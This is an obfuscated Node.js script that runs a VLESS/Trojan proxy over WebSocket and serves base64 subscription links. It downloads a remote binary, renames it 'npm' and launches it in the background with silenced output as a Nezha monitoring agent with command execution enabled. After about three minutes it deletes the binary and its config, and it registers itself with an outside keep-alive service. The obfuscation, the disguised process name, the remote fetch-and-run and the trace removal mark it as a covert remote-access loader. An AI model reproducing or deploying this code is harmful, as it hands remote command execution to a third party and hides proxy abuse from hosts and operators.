function _0x28ff(){const _0x218590=['/bin/bash','137840yIHghh','stream','then','Unknown','decode','log','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','trojan://','2083','get','Answer','url','length','type','6964185Bxmrxt','@cdns.doon.eu.org:443?security=tls&sni=','asOrganization','writeHead','hex','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','https://speed.cloudflare.com/meta','connection','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','env','chmod\x20+x\x20npm','NEZHA_KEY','arch','every','Server','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','pop','update','1.1.1.1','http','Hello\x20world!','NAME','concat','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','write','npm\x20is\x20already\x20running,\x20skip\x20running...','substr','1026qxpLzQ','net','child_process','PORT','npm\x20download\x20successfully','UUID','toString','end','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','listen','19284050utVcVU','close','setsid\x20nohup\x20./npm\x20-s\x20','country','16NwsHLe','443','includes','catch','2096','Not\x20Found\x0a','utf-8','map','11507832bJrzOJ','https://amd64.ssss.nyc.mn/agent','WSPATH','createServer','&path=%2F','pipe','aarch64','writeFileSync','digest','Failed\x20to\x20resolve\x20','text/html','readUInt8','unlink','1447098PhSuAT','buffer','application/json','finish','error:\x20','Server\x20is\x20running\x20on\x20port\x20','error','7861296zKmfWY','readUInt16BE','post','data','&fp=chrome&type=ws&host=','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','www.microsoft.com','sha224','reduce','\x20with\x20all\x20DNS\x20servers','path','once','https://dns.google/resolve?name=','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','8.8.4.4','find','25sBmANf','\x20-p\x20','https://oooo.serv00.net/add-url','https://arm64.ssss.nyc.mn/agent','connect','2087','47206MTudQW','replace','NEZHA_SERVER','createHash','join','https://amd64.ssss.nyc.mn/v1','npm','trim','vless://','https://','sub','crypto','npm\x20is\x20running','index.html','slice','base64'];_0x28ff=function(){return _0x218590;};return _0x28ff();}const _0x84b91a=_0x1098;(function(_0x52e0e2,_0x4579c3){const _0x528b89=_0x1098,_0x5b77d0=_0x52e0e2();while(!![]){try{const _0x2d16e0=-parseInt(_0x528b89(0x221))/0x1*(-parseInt(_0x528b89(0x227))/0x2)+parseInt(_0x528b89(0x20a))/0x3*(parseInt(_0x528b89(0x1f5))/0x4)+parseInt(_0x528b89(0x246))/0x5+-parseInt(_0x528b89(0x211))/0x6+-parseInt(_0x528b89(0x1fd))/0x7+-parseInt(_0x528b89(0x238))/0x8*(-parseInt(_0x528b89(0x261))/0x9)+-parseInt(_0x528b89(0x1f1))/0xa;if(_0x2d16e0===_0x4579c3)break;else _0x5b77d0['push'](_0x5b77d0['shift']());}catch(_0x111d34){_0x5b77d0['push'](_0x5b77d0['shift']());}}}(_0x28ff,0xf2acf));const os=require('os'),http=require(_0x84b91a(0x259)),fs=require('fs'),axios=require('axios'),net=require(_0x84b91a(0x262)),path=require(_0x84b91a(0x21b)),crypto=require(_0x84b91a(0x232)),{Buffer}=require(_0x84b91a(0x20b)),{exec,execSync}=require(_0x84b91a(0x1e9)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x84b91a(0x24f)][_0x84b91a(0x1ec)]||'3928d43d-f431-4322-841b-4f50235590e7',NEZHA_SERVER=process[_0x84b91a(0x24f)][_0x84b91a(0x229)]||'',NEZHA_PORT=process[_0x84b91a(0x24f)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x84b91a(0x24f)][_0x84b91a(0x251)]||'',DOMAIN=process['env']['DOMAIN']||_0x84b91a(0x217),AUTO_ACCESS=process[_0x84b91a(0x24f)]['AUTO_ACCESS']||![],WSPATH=process[_0x84b91a(0x24f)][_0x84b91a(0x1ff)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x84b91a(0x24f)]['SUB_PATH']||_0x84b91a(0x231),NAME=process[_0x84b91a(0x24f)][_0x84b91a(0x25b)]||'',PORT=process[_0x84b91a(0x24f)][_0x84b91a(0x1ea)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x26c7a9=_0x84b91a;try{const _0xc757aa=await axios[_0x26c7a9(0x241)](_0x26c7a9(0x24c)),_0x140720=_0xc757aa['data'];ISP=(_0x140720[_0x26c7a9(0x1f4)]+'-'+_0x140720[_0x26c7a9(0x248)])[_0x26c7a9(0x228)](/ /g,'_');}catch(_0x4f6ff2){ISP=_0x26c7a9(0x23b);}};GetISP();const httpServer=http[_0x84b91a(0x200)]((_0x43843c,_0x5cfb66)=>{const _0x4873a3=_0x84b91a;if(_0x43843c[_0x4873a3(0x243)]==='/'){const _0x46730b=path[_0x4873a3(0x22b)](__dirname,_0x4873a3(0x234));fs['readFile'](_0x46730b,'utf8',(_0x26f5d5,_0x27f175)=>{const _0x2a3140=_0x4873a3;if(_0x26f5d5){_0x5cfb66['writeHead'](0xc8,{'Content-Type':_0x2a3140(0x207)}),_0x5cfb66['end'](_0x2a3140(0x25a));return;}_0x5cfb66['writeHead'](0xc8,{'Content-Type':_0x2a3140(0x207)}),_0x5cfb66['end'](_0x27f175);});return;}else{if(_0x43843c[_0x4873a3(0x243)]==='/'+SUB_PATH){const _0x1cd8fc=NAME?NAME+'-'+ISP:ISP,_0x5c9a3d=_0x4873a3(0x22f)+UUID+_0x4873a3(0x255)+DOMAIN+_0x4873a3(0x215)+DOMAIN+_0x4873a3(0x201)+WSPATH+'#'+_0x1cd8fc,_0x2954af=_0x4873a3(0x23f)+UUID+_0x4873a3(0x247)+DOMAIN+_0x4873a3(0x215)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x1cd8fc,_0xd68d5b=_0x5c9a3d+'\x0a'+_0x2954af,_0x38fc76=Buffer['from'](_0xd68d5b)['toString'](_0x4873a3(0x236));_0x5cfb66[_0x4873a3(0x249)](0xc8,{'Content-Type':'text/plain'}),_0x5cfb66['end'](_0x38fc76+'\x0a');}else _0x5cfb66['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x5cfb66[_0x4873a3(0x1ee)](_0x4873a3(0x1fa));}}),wss=new WebSocket[(_0x84b91a(0x254))]({'server':httpServer}),uuid=UUID[_0x84b91a(0x228)](/-/g,''),DNS_SERVERS=[_0x84b91a(0x21f),_0x84b91a(0x258)];function resolveHost(_0x5391e1){return new Promise((_0x2aeb23,_0x307726)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x5391e1)){_0x2aeb23(_0x5391e1);return;}let _0x1a6ac6=0x0;function _0x1118f5(){const _0x46c6f8=_0x1098;if(_0x1a6ac6>=DNS_SERVERS['length']){_0x307726(new Error(_0x46c6f8(0x206)+_0x5391e1+_0x46c6f8(0x21a)));return;}const _0x3e547a=DNS_SERVERS[_0x1a6ac6];_0x1a6ac6++;const _0x582d12=_0x46c6f8(0x21d)+encodeURIComponent(_0x5391e1)+'&type=A';axios[_0x46c6f8(0x241)](_0x582d12,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x4fc40c=>{const _0x1e2085=_0x46c6f8,_0x359542=_0x4fc40c[_0x1e2085(0x214)];if(_0x359542['Status']===0x0&&_0x359542[_0x1e2085(0x242)]&&_0x359542[_0x1e2085(0x242)]['length']>0x0){const _0xcb23d=_0x359542['Answer'][_0x1e2085(0x220)](_0x29577e=>_0x29577e[_0x1e2085(0x245)]===0x1);if(_0xcb23d){_0x2aeb23(_0xcb23d[_0x1e2085(0x214)]);return;}}_0x1118f5();})[_0x46c6f8(0x1f8)](_0x3d38e6=>{_0x1118f5();});}_0x1118f5();});}function handleVlessConnection(_0x108594,_0x441a86){const _0x132869=_0x84b91a,[_0x278d68]=_0x441a86,_0x566e79=_0x441a86[_0x132869(0x235)](0x1,0x11);if(!_0x566e79[_0x132869(0x253)]((_0x39da95,_0x4e8c2d)=>_0x39da95==parseInt(uuid[_0x132869(0x260)](_0x4e8c2d*0x2,0x2),0x10)))return![];let _0x4e2aeb=_0x441a86['slice'](0x11,0x12)[_0x132869(0x208)]()+0x13;const _0x20026e=_0x441a86['slice'](_0x4e2aeb,_0x4e2aeb+=0x2)['readUInt16BE'](0x0),_0xca3828=_0x441a86[_0x132869(0x235)](_0x4e2aeb,_0x4e2aeb+=0x1)[_0x132869(0x208)](),_0x2e3428=_0xca3828==0x1?_0x441a86[_0x132869(0x235)](_0x4e2aeb,_0x4e2aeb+=0x4)[_0x132869(0x22b)]('.'):_0xca3828==0x2?new TextDecoder()[_0x132869(0x23c)](_0x441a86[_0x132869(0x235)](_0x4e2aeb+0x1,_0x4e2aeb+=0x1+_0x441a86[_0x132869(0x235)](_0x4e2aeb,_0x4e2aeb+0x1)[_0x132869(0x208)]())):_0xca3828==0x3?_0x441a86[_0x132869(0x235)](_0x4e2aeb,_0x4e2aeb+=0x10)[_0x132869(0x219)]((_0x146514,_0x178122,_0x3e4277,_0x1e2b4e)=>_0x3e4277%0x2?_0x146514[_0x132869(0x25c)](_0x1e2b4e[_0x132869(0x235)](_0x3e4277-0x1,_0x3e4277+0x1)):_0x146514,[])[_0x132869(0x1fc)](_0x500f4e=>_0x500f4e[_0x132869(0x212)](0x0)[_0x132869(0x1ed)](0x10))[_0x132869(0x22b)](':'):'';_0x108594['send'](new Uint8Array([_0x278d68,0x0]));const _0x426232=createWebSocketStream(_0x108594);return resolveHost(_0x2e3428)[_0x132869(0x23a)](_0x503c8b=>{const _0x3d178e=_0x132869;net['connect']({'host':_0x503c8b,'port':_0x20026e},function(){const _0x309acf=_0x1098;this['write'](_0x441a86[_0x309acf(0x235)](_0x4e2aeb)),_0x426232['on'](_0x309acf(0x210),()=>{})[_0x309acf(0x202)](this)['on']('error',()=>{})[_0x309acf(0x202)](_0x426232);})['on'](_0x3d178e(0x210),()=>{});})[_0x132869(0x1f8)](_0x3ebf29=>{const _0x1d85bc=_0x132869;net[_0x1d85bc(0x225)]({'host':_0x2e3428,'port':_0x20026e},function(){const _0x26bf91=_0x1d85bc;this[_0x26bf91(0x25e)](_0x441a86['slice'](_0x4e2aeb)),_0x426232['on'](_0x26bf91(0x210),()=>{})[_0x26bf91(0x202)](this)['on'](_0x26bf91(0x210),()=>{})['pipe'](_0x426232);})['on'](_0x1d85bc(0x210),()=>{});}),!![];}function handleTrojanConnection(_0xd40357,_0x3f7109){const _0xd42b33=_0x84b91a;try{if(_0x3f7109[_0xd42b33(0x244)]<0x3a)return![];const _0x40b5dd=_0x3f7109['slice'](0x0,0x38)[_0xd42b33(0x1ed)](),_0x960946=[UUID];let _0x1531fc=null;for(const _0x329ab0 of _0x960946){const _0x4ae35b=crypto[_0xd42b33(0x22a)](_0xd42b33(0x218))[_0xd42b33(0x257)](_0x329ab0)[_0xd42b33(0x205)](_0xd42b33(0x24a));if(_0x4ae35b===_0x40b5dd){_0x1531fc=_0x329ab0;break;}}if(!_0x1531fc)return![];let _0x542e77=0x38;_0x3f7109[_0x542e77]===0xd&&_0x3f7109[_0x542e77+0x1]===0xa&&(_0x542e77+=0x2);const _0x927ba7=_0x3f7109[_0x542e77];if(_0x927ba7!==0x1)return![];_0x542e77+=0x1;const _0x3f3233=_0x3f7109[_0x542e77];_0x542e77+=0x1;let _0x9515da,_0x15c141;if(_0x3f3233===0x1)_0x9515da=_0x3f7109['slice'](_0x542e77,_0x542e77+0x4)['join']('.'),_0x542e77+=0x4;else{if(_0x3f3233===0x3){const _0x2e42a2=_0x3f7109[_0x542e77];_0x542e77+=0x1,_0x9515da=_0x3f7109['slice'](_0x542e77,_0x542e77+_0x2e42a2)[_0xd42b33(0x1ed)](),_0x542e77+=_0x2e42a2;}else{if(_0x3f3233===0x4)_0x9515da=_0x3f7109['slice'](_0x542e77,_0x542e77+0x10)[_0xd42b33(0x219)]((_0x3695a7,_0x2a6722,_0x54f385,_0x45dc33)=>_0x54f385%0x2?_0x3695a7[_0xd42b33(0x25c)](_0x45dc33[_0xd42b33(0x235)](_0x54f385-0x1,_0x54f385+0x1)):_0x3695a7,[])[_0xd42b33(0x1fc)](_0x21be62=>_0x21be62[_0xd42b33(0x212)](0x0)[_0xd42b33(0x1ed)](0x10))['join'](':'),_0x542e77+=0x10;else return![];}}_0x15c141=_0x3f7109['readUInt16BE'](_0x542e77),_0x542e77+=0x2;_0x542e77<_0x3f7109[_0xd42b33(0x244)]&&_0x3f7109[_0x542e77]===0xd&&_0x3f7109[_0x542e77+0x1]===0xa&&(_0x542e77+=0x2);const _0x303bb1=createWebSocketStream(_0xd40357);return resolveHost(_0x9515da)[_0xd42b33(0x23a)](_0x10d2d7=>{const _0x35dc8f=_0xd42b33;net[_0x35dc8f(0x225)]({'host':_0x10d2d7,'port':_0x15c141},function(){const _0xaab495=_0x35dc8f;_0x542e77<_0x3f7109['length']&&this[_0xaab495(0x25e)](_0x3f7109[_0xaab495(0x235)](_0x542e77)),_0x303bb1['on'](_0xaab495(0x210),()=>{})['pipe'](this)['on']('error',()=>{})[_0xaab495(0x202)](_0x303bb1);})['on']('error',()=>{});})[_0xd42b33(0x1f8)](_0x16d552=>{const _0x4a434c=_0xd42b33;net[_0x4a434c(0x225)]({'host':_0x9515da,'port':_0x15c141},function(){const _0x1e7ea4=_0x4a434c;_0x542e77<_0x3f7109[_0x1e7ea4(0x244)]&&this['write'](_0x3f7109[_0x1e7ea4(0x235)](_0x542e77)),_0x303bb1['on'](_0x1e7ea4(0x210),()=>{})['pipe'](this)['on']('error',()=>{})[_0x1e7ea4(0x202)](_0x303bb1);})['on'](_0x4a434c(0x210),()=>{});}),!![];}catch(_0x922dda){return![];}}wss['on'](_0x84b91a(0x24d),(_0x585ab7,_0xb875b3)=>{const _0x4726ee=_0x84b91a,_0xf0b1c5=_0xb875b3[_0x4726ee(0x243)]||'';_0x585ab7[_0x4726ee(0x21c)]('message',_0x228e7f=>{const _0x3f094c=_0x4726ee;if(_0x228e7f[_0x3f094c(0x244)]>0x11&&_0x228e7f[0x0]===0x0){const _0x2f22e6=_0x228e7f[_0x3f094c(0x235)](0x1,0x11),_0x57258a=_0x2f22e6[_0x3f094c(0x253)]((_0x1dde7c,_0x3f2dfb)=>_0x1dde7c==parseInt(uuid[_0x3f094c(0x260)](_0x3f2dfb*0x2,0x2),0x10));if(_0x57258a){!handleVlessConnection(_0x585ab7,_0x228e7f)&&_0x585ab7[_0x3f094c(0x1f2)]();return;}}!handleTrojanConnection(_0x585ab7,_0x228e7f)&&_0x585ab7[_0x3f094c(0x1f2)]();})['on'](_0x4726ee(0x210),()=>{});});function _0x1098(_0x46269d,_0x1d6c10){_0x46269d=_0x46269d-0x1e9;const _0x28ffaa=_0x28ff();let _0x109869=_0x28ffaa[_0x46269d];return _0x109869;}const getDownloadUrl=()=>{const _0x2737f5=_0x84b91a,_0x281b24=os[_0x2737f5(0x252)]();return _0x281b24==='arm'||_0x281b24==='arm64'||_0x281b24===_0x2737f5(0x203)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x2737f5(0x224):!NEZHA_PORT?_0x2737f5(0x22c):_0x2737f5(0x1fe);},downloadFile=async()=>{const _0x31d631=_0x84b91a;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1b0f8a=getDownloadUrl(),_0x3051ab=await axios({'method':'get','url':_0x1b0f8a,'responseType':_0x31d631(0x239)}),_0x55be7a=fs['createWriteStream'](_0x31d631(0x22d));return _0x3051ab[_0x31d631(0x214)][_0x31d631(0x202)](_0x55be7a),new Promise((_0x1e252f,_0x180883)=>{const _0x30d318=_0x31d631;_0x55be7a['on'](_0x30d318(0x20d),()=>{const _0x25d499=_0x30d318;console['log'](_0x25d499(0x1eb)),exec(_0x25d499(0x250),_0x457f02=>{if(_0x457f02)_0x180883(_0x457f02);_0x1e252f();});}),_0x55be7a['on'](_0x30d318(0x210),_0x180883);});}catch(_0x5ed4c9){throw _0x5ed4c9;}},runnz=async()=>{const _0x31bad7=_0x84b91a;try{const _0x1fead1=execSync(_0x31bad7(0x24b),{'encoding':_0x31bad7(0x1fb)});if(_0x1fead1[_0x31bad7(0x22e)]()!==''){console[_0x31bad7(0x23d)](_0x31bad7(0x25f));return;}}catch(_0x65e391){}await downloadFile();let _0x2dda94='',_0x1087b2=[_0x31bad7(0x1f6),'8443',_0x31bad7(0x1f9),_0x31bad7(0x226),_0x31bad7(0x240),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xa2bb47=_0x1087b2[_0x31bad7(0x1f7)](NEZHA_PORT)?'--tls':'';_0x2dda94=_0x31bad7(0x1f3)+NEZHA_SERVER+':'+NEZHA_PORT+_0x31bad7(0x222)+NEZHA_KEY+'\x20'+_0xa2bb47+_0x31bad7(0x24e);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x559921=NEZHA_SERVER[_0x31bad7(0x1f7)](':')?NEZHA_SERVER['split'](':')[_0x31bad7(0x256)]():'',_0x44aa9b=_0x1087b2[_0x31bad7(0x1f7)](_0x559921)?'true':'false',_0x452022='client_secret:\x20'+NEZHA_KEY+_0x31bad7(0x21e)+NEZHA_SERVER+_0x31bad7(0x25d)+_0x44aa9b+_0x31bad7(0x23e)+UUID;fs[_0x31bad7(0x204)]('config.yaml',_0x452022);}_0x2dda94=_0x31bad7(0x1ef);}else{console[_0x31bad7(0x23d)](_0x31bad7(0x216));return;}}try{exec(_0x2dda94,{'shell':_0x31bad7(0x237)},_0x54aa92=>{const _0x1ea963=_0x31bad7;if(_0x54aa92)console['error']('npm\x20running\x20error:',_0x54aa92);else console[_0x1ea963(0x23d)](_0x1ea963(0x233));});}catch(_0x5756b7){console[_0x31bad7(0x210)](_0x31bad7(0x20e)+_0x5756b7);}};async function addAccessTask(){const _0x1d8277=_0x84b91a;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3f8515=_0x1d8277(0x230)+DOMAIN+'/'+SUB_PATH;try{const _0x2d07c8=await axios[_0x1d8277(0x213)](_0x1d8277(0x223),{'url':_0x3f8515},{'headers':{'Content-Type':_0x1d8277(0x20c)}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x4a8a2f){}}const delFiles=()=>{const _0x56d776=_0x84b91a;fs[_0x56d776(0x209)](_0x56d776(0x22d),()=>{}),fs[_0x56d776(0x209)]('config.yaml',()=>{});};httpServer[_0x84b91a(0x1f0)](PORT,()=>{const _0xa87cdb=_0x84b91a;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xa87cdb(0x23d)](_0xa87cdb(0x20f)+PORT);});
